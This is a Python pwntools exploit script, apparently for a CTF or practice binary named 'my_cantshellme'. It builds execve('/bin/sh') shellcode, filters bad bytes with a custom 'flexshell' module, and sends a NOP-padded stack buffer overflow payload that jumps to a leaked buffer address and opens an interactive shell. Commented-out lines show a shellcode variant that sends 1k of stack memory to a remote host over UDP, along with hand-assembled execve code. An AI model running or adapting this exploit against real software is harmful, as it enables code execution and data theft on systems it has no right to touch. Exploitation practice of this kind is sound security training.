#!/usr/bin/env python3
from pwn import *
from pwnlib import flexshell

context(arch = 'amd64', os='linux')

p = process('./my_cantshellme')

bufflen = 168

##################################################################
# New shellcraft functionality:
# 
#   shellcraft.updpeer() - Sends 1k of the stack to a remote host
#   via UDP.
#
##################################################################
#shellcode = shellcraft.udppeer('127.0.0.1',55555)
#shellcode = asm(shellcode)
##################################################################


##################################################################
# New shellcraft functionality:
# 
#   shellcraft.flexshell() - Removes unwanted bytes from shellcode.
#   (non functional)
##################################################################
##################################################################
#avoid = b'/bin/sh\x00'
#shellcode = shellcraft.flexshell(shellcode, avoid)
##################################################################


##################################################################
# New shellcraft functionality:
# 
#   flexshell - Removes unwanted bytes from shellcode.
#   
##################################################################
##################################################################
#shellcode = flexshell.nobinsh()
##################################################################
##################################################################
code = asm(shellcraft.sh())
print(code)
avoid = b'/bin/sh\x00'
shellcode = flexshell.flex(code, avoid)
print(shellcode)
##################################################################
##################################################################
#shellcode = asm('mov rax, 0x3b')
#shellcode += asm('pushq 0')
#shellcode += asm('mov rdx, rsp')
#shellcode += asm('mov rsi, rsp')
#shellcode += asm('mov r10, 0x68732f6e6922f')
#shellcode += asm('push r10')
#shellcode += asm('mov rdi, rsp')
#shellcode += asm('syscall')

#avoid = b'/bin///sh\x00'
#avoid = b'\x00' 
#shellcode = flexshell.flex(shellcode, avoid)
##################################################################
#print(shellcode)

sclen = len(shellcode)
#print(sclen)

p.recvuntil(b': ')
buff_addr_str = p.recvlines(1)
buff_addr = int(buff_addr_str[0],16)
payload = (b'\x90' * 8) + shellcode + (b'\x90' *(bufflen - (sclen + 8)))  + p64(buff_addr) 

p.send(payload)
p.interactive()

